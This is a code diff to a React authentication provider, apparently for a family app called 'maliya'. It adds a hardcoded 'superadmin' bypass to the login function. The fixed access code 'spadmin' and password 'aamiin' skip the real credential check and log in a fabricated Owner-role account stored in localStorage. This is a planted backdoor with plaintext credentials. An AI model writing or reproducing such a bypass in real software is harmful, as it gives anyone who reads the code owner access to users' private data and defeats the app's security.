@@ -36,6 +36,26 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
 
   const login = useCallback(async (accessCode: string, password: string): Promise<{ success: boolean; error?: string }> => {
     try {
+      // 0. Superadmin hardcoded bypass
+      if (accessCode.trim().toLowerCase() === 'spadmin' && password === 'aamiin') {
+        const superadmin: FamilyMember = {
+          id: 'superadmin',
+          name: 'Super Admin',
+          relationship: 'Other',
+          role: 'Owner',
+          email: 'superadmin@maliya.app',
+          phone: '',
+          avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=SuperAdmin',
+          joinedDate: new Date().toISOString().split('T')[0],
+          status: 'Active',
+          accessCode: 'spadmin',
+          password: 'aamiin'
+        };
+        setCurrentUser(superadmin);
+        localStorage.setItem('maliya_session', JSON.stringify(superadmin));
+        return { success: true };
+      }
+
       // 1. Fetch all family members
       const members = await FamilyMemberService.getAll();
       
